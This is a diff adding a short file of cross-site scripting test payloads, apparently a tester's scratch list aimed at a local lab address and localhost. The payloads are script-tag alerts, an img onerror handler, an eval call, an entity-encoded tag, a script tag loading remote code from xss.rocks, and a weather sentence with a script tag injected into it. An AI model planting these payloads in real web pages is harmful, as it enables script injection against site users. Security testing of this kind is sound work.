@@ -1,0 +1,18 @@
+<script>alert(1)</script>
+
+http://192.168.56.103/
+
+
+http://127.0.0.1:5500/
+
+ <img src='' onerror="alert()" />
+
+
+eval(alert(2))
+
+<SCRIPT SRC=http://xss.rocks/xss.js?< B >
+
+
+&#60;script&#62;alert(1)&#60;/script&#62;
+
+Friday will bring us <script >alert (" XSS") </ script > calm and mostly dry , but also very cold winter 5 weather . Only high fog patches will persist for 6 a longer period of time .
